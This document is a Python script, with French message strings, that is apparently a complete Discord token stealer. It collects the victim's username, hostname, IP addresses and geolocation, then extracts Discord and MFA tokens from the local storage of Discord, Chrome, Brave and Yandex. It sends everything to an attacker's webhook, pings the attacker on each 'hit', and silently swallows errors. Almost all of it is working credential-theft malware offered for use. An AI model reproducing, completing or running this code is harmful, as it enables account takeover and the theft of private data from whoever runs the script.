import os
import re
import json
from urllib.request import Request, urlopen
import socket
from requests import get
from getpass import getuser

username = os.getlogin()
current_user = os.getlogin()

hostname = socket.gethostname()
IP2 = socket.gethostbyname(hostname)
IP = get("https://api.ipify.org/").text
IP3 = socket.AddressInfo

url = 'http://ipinfo.io/json'
response = urlopen(url)
data = json.load(response)

org=data['org']
city=data['city']
country=data['country']
region=data['region']
timezone=data['timezone']
postal=data['postal']


# your webhook URL
WEBHOOK_URL = 'WEBHOOK_URL'

# mentions you when you get a hit
PING_ME = True

def find_tokens(path):
    path += '\\Local Storage\\leveldb'

    tokens = []

    for file_name in os.listdir(path):
        if not file_name.endswith('.log') and not file_name.endswith('.ldb'):
            continue

        for line in [x.strip() for x in open(f'{path}\\{file_name}', errors='ignore').readlines() if x.strip()]:
            for regex in (r'[\w-]{24}\.[\w-]{6}\.[\w-]{27}', r'mfa\.[\w-]{84}'):
                for token in re.findall(regex, line):
                    tokens.append(token)
    return tokens


def main():
    local = os.getenv('LOCALAPPDATA')
    roaming = os.getenv('APPDATA')

    paths = {
        'Token Discord': roaming + '\\Discord',
        'Token Discord': roaming + '\\Discord',
        'Discord Canary': roaming + '\\discordcanary',
        'Discord PTB': roaming + '\\discordptb',
        'Google Chrome': local + '\\Google\\Chrome\\User Data\\Default',
        'Brave': local + '\\BraveSoftware\\Brave-Browser\\User Data\\Default',
        'Yandex': local + '\\Yandex\\YandexBrowser\\User Data\\Default',
    }


    message = "Username : " f'**{current_user}**\n' + "Username 2 : " f'**{username}**\n' + "Zone :pensive: : " f'**{timezone}**\n' +"Code Postal : " f'**{postal}**\n' + "Région : " f'**{region}**\n' + "Pays : " f'**{country}**\n' + "opérateur connexion : " f'**{org}**\n' + "Ville : " f'**{city}**\n' + "IP Connexion : " f'**{IP}**\n' +  "IPMac (nom du pc) : " f'**{IP2}**\n' + "Nom du PC : " f'**{hostname}**\n' + f'Va sur : **https://ipinfo.io** pour + de données' if PING_ME else ''
    #print(f'{message}')

    for platform, path in paths.items():
        if not os.path.exists(path):
            continue

        message += f'\n**{platform}**\n```'

        tokens = find_tokens(path)

        if len(tokens) > 0:
            for token in tokens:
                message += f'{token}\n'
        else:
            message += 'Aucun Token ici\n'

        message += f'```||@everyone||'

    headers = {
        'Content-Type': 'application/json',
        'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.11 (KHTML, like Gecko) Chrome/23.0.1271.64 Safari/537.11'
    }

    payload = json.dumps({'content': message})

    try:
        req = Request(WEBHOOK_URL, data=payload.encode(), headers=headers)
        urlopen(req)
    except:
        pass

if __name__ == '__main__':
    main() 
